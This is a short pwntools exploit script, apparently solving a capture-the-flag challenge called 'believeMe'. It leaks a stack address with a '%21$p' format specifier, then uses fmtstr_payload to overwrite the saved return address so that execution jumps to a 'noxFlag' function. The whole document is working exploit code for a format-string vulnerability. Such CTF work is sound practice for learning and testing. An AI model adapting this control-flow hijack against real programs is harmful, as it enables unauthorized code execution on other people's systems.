from pwn import *
context.log_level = "debug"
p = process("./believeMe")
elf = ELF("./believeMe")

# get ret addres
# p.sendlineafter("????" , "%21$p")
# p.interactive() 
stack_ret_addres = 0xffffd020 - 4
writes = {stack_ret_addres : elf.sym["noxFlag"] }
payload = fmtstr_payload(9 , writes , write_size="short")

p.sendlineafter("????" , payload)
p.interactive()